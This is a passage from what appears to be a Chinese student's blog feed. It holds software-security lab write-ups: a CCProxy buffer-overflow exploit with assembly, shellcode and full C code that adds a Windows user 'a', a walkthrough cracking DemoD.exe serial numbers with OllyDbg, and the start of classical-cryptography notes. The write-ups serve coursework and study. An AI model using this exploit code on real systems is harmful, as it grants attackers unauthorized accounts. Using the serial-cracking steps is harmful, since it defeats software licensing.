style="margin-right:0.13889em;">P</span></span></span></span>跳转</h2>
<p>上述断点设置成功后，在该软件中运行CCProxy并在控制台中ping一个较长的字符串（使其发生溢出），在该软件中会在断点前停下来，这时单步步过执行到“ret 0xc”指令处观察此时的ESP=0x012B66F0，由此可知当“ret 0xc”指令执行后的下一指令对应地址为0x012B66F0，而执行后EIP=[ESP]且ESP=ESP+0xC+0x4，接下来考虑将ESP指向地址覆盖为JMP ESP指令所在地址，然后将修改过的ESP填充我们想要执行的shellcode即可。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626215648.png" alt="Ret指令前的ESP指向值" /></p>
<p>此时的我们想要将ESP指向地址执行JMP ESP指令，在本区域内搜索指令“JMP ESP”后发现没有该指令，于是我们查询所有模块中的指令即可。这里搜索到的“JMP ESP”指令众多，考虑到后面我们将JMP ESP指令填入shellcode时将其存放在字符数组内而可编写字符的ASCII范围为0x20-0x7F，我们可以选取0x00514C6E。（也可以使用\x转义）。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626215743.png" alt="查询JMP ESP指令" /></p>
<p>接下来只需要先把ESP指向地址覆盖为我们想要的“JMP ESP”指令地址即可。观察可以发现在当前ESP指令的接下来一段数据已经被我们输入的字符串（这里输入的全部是‘a’即ASCII码61覆盖）。</p>
<img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626215834.png" alt="修改ESP指向地址" style="zoom:50%;" />
<h2 id="添加shellcode"><a class="markdownIt-Anchor" href="#添加shellcode"></a> 添加<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mi>h</mi><mi>e</mi><mi>l</mi><mi>l</mi><mi>c</mi><mi>o</mi><mi>d</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">Shellcode</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span></span></span></span></h2>
<p>接下来我们来实现基本的添加用户的shellcode，在cmd控制台中的命令为“net user a /add”（这里添加一个用户名为a的用户）。在程序语言中便需要调用system函数，在工具中查看当前程序的符号界面会发现该程序加载了“msvcrt.dll”的系统动态链接库文件，而其中便包含有system函数，因此我们就可以利用这一点实现shellcode的注入及利用。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626220117.png" alt="程序加载了msvcrt.dll库文件" /></p>
<p>接下来我们先编写shellcode来获取shellcode的机器码然后实现注入，这里利用的工具为VS2019，实现win32控制台应用的方法为“新建桌面引导→控制台程序”，编写shellcode的代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;winbase.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    LoadLibrary(<span class="string">&quot;msvcrt.dll&quot;</span>);</span><br><span class="line">    __asm&#123;</span><br><span class="line">            push ebp ;保存ebp，esp－<span class="number">4</span></span><br><span class="line">            mov ebp,esp ;给ebp赋新值，将作为局部变量的基指针</span><br><span class="line">            <span class="keyword">xor</span> edi,edi ;</span><br><span class="line">            push edi ;压入<span class="number">0</span>，esp－<span class="number">4</span>,;作用是构造字符串的结尾\<span class="number">0</span>字符 </span><br><span class="line">            sub esp,<span class="number">0</span>ch</span><br><span class="line">            mov byte ptr [ebp<span class="number">-10</span>h],<span class="number">6</span>eh;n</span><br><span class="line">            mov byte ptr [ebp<span class="number">-0f</span>h],<span class="number">65</span>h;e</span><br><span class="line">            mov byte ptr [ebp<span class="number">-0</span>eh],<span class="number">74</span>h;t</span><br><span class="line">            mov byte ptr [ebp<span class="number">-0</span>dh],<span class="number">20</span>h;空格</span><br><span class="line">            mov byte ptr [ebp<span class="number">-0</span>ch],<span class="number">75</span>h;u</span><br><span class="line">            mov byte ptr [ebp<span class="number">-0b</span>h],<span class="number">73</span>h;s</span><br><span class="line">            mov byte ptr [ebp<span class="number">-0</span>ah],<span class="number">65</span>h;e</span><br><span class="line">            mov byte ptr [ebp<span class="number">-09</span>h],<span class="number">72</span>h;r</span><br><span class="line">            mov byte ptr [ebp<span class="number">-08</span>h],<span class="number">20</span>h;空格</span><br><span class="line">            mov byte ptr [ebp<span class="number">-07</span>h],<span class="number">61</span>h;a</span><br><span class="line">            mov byte ptr [ebp<span class="number">-06</span>h],<span class="number">20</span>h;空格</span><br><span class="line">            mov byte ptr [ebp<span class="number">-05</span>h],<span class="number">2f</span>h;/</span><br><span class="line">            mov byte ptr [ebp<span class="number">-04</span>h],<span class="number">61</span>h;a</span><br><span class="line">            mov byte ptr [ebp<span class="number">-03</span>h],<span class="number">64</span>h;d</span><br><span class="line">            mov byte ptr [ebp<span class="number">-02</span>h],<span class="number">64</span>h;d</span><br><span class="line">            lea eax,[ebp<span class="number">-10</span>h] ;</span><br><span class="line">            push eax ;串地址作为参数入栈</span><br><span class="line">            mov eax, <span class="number">0x77bf93c7</span>;</span><br><span class="line">            call eax ;调用system</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后反汇编得到汇编代码，在memory中可以查看到汇编语句在内存中的机器码表示，由于程序已经加载了msvcrt.dll库文件，因此我们这里只需要shellcode的机器码即可，观察汇编代码块中语句的起始地址为01001782（push ebp），结束地址为call命令所在地址，在memory中查找该地址对应的机器码即可。</p>
<img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626220413.png" alt="Shellcode对应机器码" style="zoom:50%;" />
<p>接下来利用缓冲区的溢出来执行shellcode，上述所得在第1012个字节处发生溢出，因此我们需要执行“JMP ESP”指令就需要将该指令的地址填入1013-1016字节，及为上述的00514C6E。当执行完该指令后就会跳转到已经经过变化的ESP处，此时的ESP执行地址应该为1013+0xC+0x4个字节；这里由于CCProxy会有一个字符串的覆盖操作，将第5个字节到1012个字节复制到1013+0xC+0x4字节处，所以我们的shellcode需要放在第5个字节到第1012个字节之间。</p>
<p>本机与CCPROXY 的连接是TCP连接，首先需要编写程序以TELNET的形式登陆到 CCPROXY 上，即建立TCP连接，去连接 CCPROXY 的23号端口，一旦连接建立好了后， 便可以发送 TCP 报文，报文的内容是ping主机名\r\n ，主机名便填写上文提到的超长的字符串进行溢出。注入 shellcode 后执行7FFA4512 即 JMP ESP。字符串的前 4 个字节为无用的字节，从第五个字节开始便可以用来写 ShellCode，构造的ping主机名应当如下：4 个字节的无用指令+ShellCode（最多可以从第5个字节到1012个字节）+jmp esp（第1013个字节到第 1016个）+最后的填充字节。</p>
<p>编写的C语言代码及shellcode机器码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;MSWSock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WIN32_LEAN_AND_MEAN</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_LEN 2000</span></span><br><span class="line"><span class="keyword">char</span> shell[] =<span class="string">&quot;\x55\x8b\xec\x33\xff\x57\x83\xec &quot;</span></span><br><span class="line">              <span class="string">&quot;\x0c\xc6\x45\xf0\x6e\xc6\x45\xf1 &quot;</span></span><br><span class="line">              <span class="string">&quot;\x65\xc6\x45\xf2\x74\xc6\x45\xf3 &quot;</span></span><br><span class="line">              <span class="string">&quot;\x20\xc6\x45\xf4\x75\xc6\x45\xf5 &quot;</span></span><br><span class="line">              <span class="string">&quot;\x73\xc6\x45\xf6\x65\xc6\x45\xf7 &quot;</span></span><br><span class="line">              <span class="string">&quot;\x72\xc6 x45\xf8\x20\xc6\x45\xf9 &quot;</span></span><br><span class="line">              <span class="string">&quot;\x61\xc6 x45\xfa\x20\xc6\x45\xfb &quot;</span></span><br><span class="line">              <span class="string">&quot;\x2f\xc6\x45\xfc\x61\xc6\x45\xfd &quot;</span></span><br><span class="line">              <span class="string">&quot;\x64\xc6\x45\xfe\x64\x8d\x45\xf0 &quot;</span></span><br><span class="line">              <span class="string">&quot;\x50\xb8\xc7\x93\xbf\x77\xff\xd0 &quot;</span>;<span class="comment">//shellcode机器码</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WSADATA ws;<span class="comment">//初始化ws</span></span><br><span class="line">    <span class="keyword">int</span> ret = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;ws);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sa</span>;</span></span><br><span class="line">    sa.sin_family = AF_INET;</span><br><span class="line">    sa.sin_port = htons(<span class="number">23</span>);</span><br><span class="line">    sa.sin_addr.s_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[MAX_LEN];</span><br><span class="line">    <span class="keyword">char</span> buf1[<span class="number">1024</span>];</span><br><span class="line">    buf[<span class="number">0</span>] = <span class="string">&#x27;p&#x27;</span>;</span><br><span class="line">    buf[<span class="number">1</span>] = <span class="string">&#x27;i&#x27;</span>;</span><br><span class="line">    buf[<span class="number">2</span>] = <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">    buf[<span class="number">3</span>] = <span class="string">&#x27;g&#x27;</span>;</span><br><span class="line">    buf[<span class="number">4</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    <span class="keyword">int</span> l = <span class="built_in">strlen</span>(shell);</span><br><span class="line">    buf[<span class="number">5</span>] = buf[<span class="number">6</span>] = buf[<span class="number">7</span>] = buf[<span class="number">8</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="comment">//前4个字节为无用字节</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">9</span>; j &lt; <span class="number">9</span> + l; j++)</span><br><span class="line">        buf[j] = shell[j - <span class="number">9</span>];</span><br><span class="line">    <span class="comment">//插入shellcode</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">9</span> + l; i &lt; <span class="number">1012</span> + <span class="number">5</span>; i++)</span><br><span class="line">        buf[i] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="comment">//到溢出点为止都填入无用字节</span></span><br><span class="line">    buf[<span class="number">1017</span>] = <span class="number">0x6E</span>;</span><br><span class="line">    buf[<span class="number">1018</span>] = <span class="number">0x4C</span>;</span><br><span class="line">    buf[<span class="number">1019</span>] = <span class="number">0x51</span>;</span><br><span class="line">    buf[<span class="number">1020</span>] = <span class="number">0x00</span>;</span><br><span class="line">    <span class="comment">//这里为JMP ESP的地址，00514C6E</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1021</span>; i &lt; <span class="number">1998</span>; i++)</span><br><span class="line">        buf[i] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    buf[<span class="number">1998</span>] = <span class="string">&#x27;\r&#x27;</span>;</span><br><span class="line">    buf[<span class="number">1999</span>] = <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    <span class="comment">//命令结束回车换行</span></span><br><span class="line">    <span class="comment">//创建Socket</span></span><br><span class="line">    SOCKET sc = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//连接到服务器</span></span><br><span class="line">    ret = connect(sc, (<span class="keyword">const</span> sockaddr*)&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">    recv(sc, buf1, <span class="number">1024</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//接收服务器端的回答</span></span><br><span class="line">    ret = send(sc, buf, <span class="number">2000</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//发送攻击数据</span></span><br><span class="line">    closesocket(sc);</span><br><span class="line">    WSACleanup();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后运行CCproxy，再次执行上面的代码会发现CCProxy发生了溢出崩溃，理论上来说，代码成功执行会在系统中添加一个名为a的用户，在CMD窗口下利用net user指令查看用户状况可以发现已经成功添加，shellcode正确执行。</p>
<img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626220545.png" alt="用户添加成功"  />
<p>至此，利用简单的溢出漏洞来实现添加用户的功能已经完成。</p>
<hr />
<div class="note pink icon simple"><i class="note-icon fas fa-car-crash"></i><p><strong><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mi>s</mi><mo>:</mo></mrow><annotation encoding="application/x-tex">ps:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span></span></span>这是软件安全第二次实验的内容，最近的病毒实验实在太烧脑，希望后续能将这一部分完整记录下来！</strong></p>
</div>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/05AE3B62.gif" alt="img" /></p>
]]></content>
      <categories>
        <category>网络攻防</category>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>网络攻防</tag>
        <tag>软件安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Win32漏洞---破解DemoD.exe序列号</title>
    <url>/2021/06/26/Win32%E6%BC%8F%E6%B4%9E-%E7%A0%B4%E8%A7%A3DemoD-exe%E5%BA%8F%E5%88%97%E5%8F%B7/</url>
    <content><![CDATA[<hr />
<p><strong><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mi>s</mi><mo>:</mo></mrow><annotation encoding="application/x-tex">ps:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span></span></span>软件安全第一次实验内容，简单破解序列号(最后只破解了部分)</strong></p>
<hr />
<h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
<p><strong>操作系统：Microsoft windows XP SP3</strong></p>
<p><strong>目标软件：DemoD.exe</strong></p>
<p><strong>分析工具：LordPE, OllyDbg，Visual C++ 6.0</strong></p>
<h1 id="实验过程记录"><a class="markdownIt-Anchor" href="#实验过程记录"></a> 实验过程记录</h1>
<p>首先用OllyDbg打开测试程序，这里对DemoD_简版.exe程序进行分析，对序列码的破解首先由于提示错误以窗口形式出现，所以这里对所有的MessageBox设置API断点，运行程序输入序列码测试发现程序在提示错误的地方发生中断。如下图中所示。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626222710.png" alt="找到序列码匹配段的地址" /></p>
<p>接下来在代码区右键选择中文搜索引擎，点击智能搜索，会在搜索结果中发现部分提示信息，双击提示信息即可进入该段代码，搜索结果如图所示。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626222802.png" alt="利用中文搜索字符串" /></p>
<p>双击上图中的“恭喜你！序列号第1部分正确！”进入序列号匹配段，进入后会发现在提示信息之前有一段“cmp eax,ecx”的代码，随后便出现“jnz DemoD_简.0040400C”的跳转指令，猜测cmp的指令为比较输入序列号和正确序列号的值，而跳转指令为输出错误信息的窗口。在比较指令之前设置断点，运行程序，设置第一段序列号为1234，请求验证序列号。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626222845.png" alt="设置断点" /></p>
<p>运行程序后，发现程序在上述断点处中断，接下来单步执行到比较指令处，由于设置的第一部分序列号为1234，这时观察右侧的寄存器值会发现EAX=00001234，ECX=0000AC70，可以判定EAX为自己所输入的值，而ECX即AC70即为第一段序列号的正确值。接下来，删除该处的断点，将断点设置在第二部分比较指令之前，再次运行，将已知地正确序列号输入，并将即将判断的序列号设置为1234，以此循环往复便可以得到第二部分和第三部分正确序列号的值。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626222918.png" alt="第一部分比较" /></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626222944.png" alt="第一部分验证" /></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223004.png" alt="第二部分比较" /></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223027.png" alt="第二部分正确" /></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223052.png" alt="第三部分比较" /></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223114.png" alt="第三部分正确" /></p>
<hr />
<p>第四部分的判断逻辑较为复杂，且只在极少情况下会验证通过，这里只描述第四部分序列码的判断逻辑。观察这一部分的比较前的代码可知，对EAX和ECX的值进行比较，而EAX为ss:[ebp-0x158]处的值，假设我们输入的序列号为A-B-C-D，观察堆栈区地数值可以发现，ECX为A+B+C的值然后右移四位所得。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223205.png" alt="分析逻辑1" /></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223222.png" alt="分析逻辑2" /></p>
<p>由上图可知，EBP-128、EBP-12C和EBP-130处存储的值为上述的ABC，而接下来的便是我们输入的完整的序列码。这里我们继续探究EAX的值即EBP-158处的值，往上查找代码会发现：首先查阅堆栈段发现[EBP-0x138]为A的值，而[EBP-0x144]为D的值，首先将二者相加赋予ECX，再将ECX与0xAFDA进行与操作后得到新的ECX，将ECX的值赋予[EBP-148]后赋给DX，最后将DX赋给[EBP-0x158]，最后得到EAX的值再与ECX进行比较进行判断。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223249.png" alt="分析逻辑4" /></p>
<p><em><strong><u>关于第四部分序列号的比较逻辑：</u></strong></em></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223622.png" alt="第四部分序列号" /></p>
<hr />
<h1 id="实验问题"><a class="markdownIt-Anchor" href="#实验问题"></a> 实验问题</h1>
<p>首先便是对**<u><em>断点的设置问题</em></u>**，利用常规思维便是在某处将输入的序列码与正确的序列码进行比较，而正确的序列码与输入待验证的序列码都存放在寄存器中，通过识别自己输入的序列码便可以获得正确的序列码从而进行下一部分的验证。实验过程中在设置断点时，利用中文搜索引擎获得当序列号输入正确时中文提示的语句所在位置，往上遍历便能得到“CMP”指令进行比较所在位置。这里对于前三部分的断点设置经历尝试后，设置于比较指令之前然后断点停下后再单步运行至该指令即可。</p>
<p>第二个问题便是***<u>正确序列码的变化问题</u>***，实验过程中发现，当实验时间超过一定时间后再次运行时，发现之前尝试获得的正确序列码已经发生了变化，重新进行实验验证便会发现已经生成了全新的正确的序列码等待验证。这在实验过程中造成了很大的困扰，多次尝试后才发现了这个问题。如上面实验过程中验证的前三部分正确的序列码为“AC70-BC32-E911”，而下图为另外一次尝试过程中的前三部分序列码验证正确时的场景，此时序列码为“D100-BC32-C386”。经过验证发现大概每1个小时左右序列码便会更新一次。</p>
<p>第三个问题便是***<u>最后一段序列码的验证问题</u>***，我仍旧天真的以为第四段序列码的验证方式与前三段的验证方式是相同的，当尝试多次失败后回过头去分析代码才发现程序将输入的前三段序列码进行了一定程度的数学运算后才会进行比较，也就是说第四段序列码并不是单纯的独立序列码，而是与前三段序列码都相关，（具体的运算分析可以参考上述实验一实验过程记录中的分析过程）。此外，在该部分序列码的运算过程中涉及了一个与“0xAFDA”的按位与操作，该操作之后产生的结果与正确的结果比较时会发生较大的误差，由于产生的与“0xAFDA”进行按位与操作的序列码与该时间内产生的序列码前三部分都相关，因此对前三部分序列码的要求较为严格，经过大致的分析，在同一时间内要求产生正确的可行的序列码的概率约为1/8，综合上面讲到的一个小时更换一次序列码来说，时间成本是极高的，因此这里在实验过程中只对第四部分的序列码的产生过程进行了简述。</p>
<hr />
<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mi>K</mi><mo separator="true">,</mo><mi>L</mi><mi>e</mi><msup><mi>t</mi><mo mathvariant="normal">′</mo></msup><mi>s</mi><mtext> </mtext><mi>g</mi><mi>o</mi><mo stretchy="false">!</mo></mrow><annotation encoding="application/x-tex">OK,Let&#x27;s\ go!</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">L</span><span class="mord mathdefault">e</span><span class="mord"><span class="mord mathdefault">t</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">s</span><span class="mspace"> </span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">o</span><span class="mclose">!</span></span></span></span></p>
]]></content>
      <categories>
        <category>网络攻防</category>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>网络攻防</tag>
        <tag>软件安全</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学笔记之（一） 古典密码</title>
    <url>/2021/04/17/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0%E4%B9%8B%EF%BC%88%E4%B8%80%EF%BC%89-%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<hr />
<h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言：</h2>
<p>密码学的目的是为了使两个处于不安全信道中通信的双方，在经过某种加密方法后，用过一种别人无法理解通信内容的方式进行通信。不安全信道是普遍内存在的，而绝对的加密是不存在的，本文将跟随我密码学课程的进行，对几种古典密码进行介绍和实现。</p>
<p><em><strong>密码体制：</strong></em></p>
<p>一个密码体制是满足以下条件的五元组<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><mi>C</mi><mo separator="true">,</mo><mi>K</mi><mo separator="true">,</mo><mi>ε</mi><mo separator="true">,</mo><mi>D</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(P,C,K,ε,D)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">ε</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mclose">)</span></span></span></span>：</p>
<table>
<thead>
<tr>
<th style="text-align:center">P</th>
<th style="text-align:center">明文组成的有限集</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">C</td>
<td style="text-align:center">密文组成的有限集</td>
</tr>
<tr>
<td style="text-align:center">K</td>
<td style="text-align:center">密钥空间</td>
</tr>
<tr>
<td style="text-align:center">ε</td>
<td style="text-align:center">加密规则</td>
</tr>
<tr>
<td style="text-align:center">D</td>
<td style="text-align:center">解密规则</td>
</tr>
</tbody>
</table>
<p>对每一个<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>k</mi><mo>∈</mo><mi>K</mi><mi mathvariant="normal">，</mi><msub><mi>e</mi><mi>k</mi></msub><mo>∈</mo><mi>ε</mi><mi mathvariant="normal">，</mi><msub><mi>d</mi><mi>k</mi></msub><mo>∈</mo><mi>D</mi></mrow><annotation encoding="application/x-tex">k∈K，e_k∈ε，d_k∈D</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathdefault">ε</span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span></span></span></span>且<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>e</mi><mi>k</mi></msub><mo>:</mo><mi>P</mi><mo>→</mo><mi>C</mi><mo separator="true">,</mo><msub><mi>d</mi><mi>k</mi></msub><mo>:</mo><mi>C</mi><mo>→</mo><mi>P</mi></mrow><annotation encoding="application/x-tex">e_k:P→C,d_k:C→P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" 